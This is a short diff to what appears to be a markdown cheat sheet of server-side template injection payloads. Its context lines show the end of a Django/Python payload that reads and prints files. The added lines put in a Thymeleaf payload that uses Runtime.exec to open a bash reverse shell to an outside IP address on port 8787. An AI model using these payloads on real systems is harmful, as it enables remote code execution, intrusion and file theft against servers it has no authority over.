@@ -106,3 +106,9 @@ for f in request.resolver_match.tried[1][0].urlconf_name.views.html.parser.re.en
         for s in f.iterdir():
             print(s.read_text())
 ```
+
+## thymeleaf
+
+`<p th:text="${T(java.lang.Runtime).getRuntime().exec('bash -c $@|bash 0 echo /bin/bash -i >& /dev/tcp/1.1.1.1/8787 0>&1')}"></p>`
+
+
